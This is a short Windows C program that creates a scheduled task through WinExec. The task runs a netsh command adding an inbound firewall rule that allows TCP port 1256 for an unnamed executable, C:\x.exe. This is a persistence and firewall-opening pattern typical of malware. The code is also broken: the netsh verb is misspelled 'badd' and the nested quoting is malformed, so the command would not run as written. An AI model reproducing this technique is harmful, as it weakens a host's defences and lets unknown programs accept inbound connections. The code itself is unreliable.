#include <windows.h>

#define RUN(toRun) WinExec("schtasks /create /tn MyTask /tr \"cmd.exe /c \"" toRun "\" /sc once /st 00:00", SW_SHOW);

int main() {
    RUN("netsh advfirewall firewall badd rule name=\"some_rule\" dir=in action=allow protocol=TCP localport=1256 program=\"C:\\x.exe\" description=\"xxx\" enable=yes");
    return 0;
}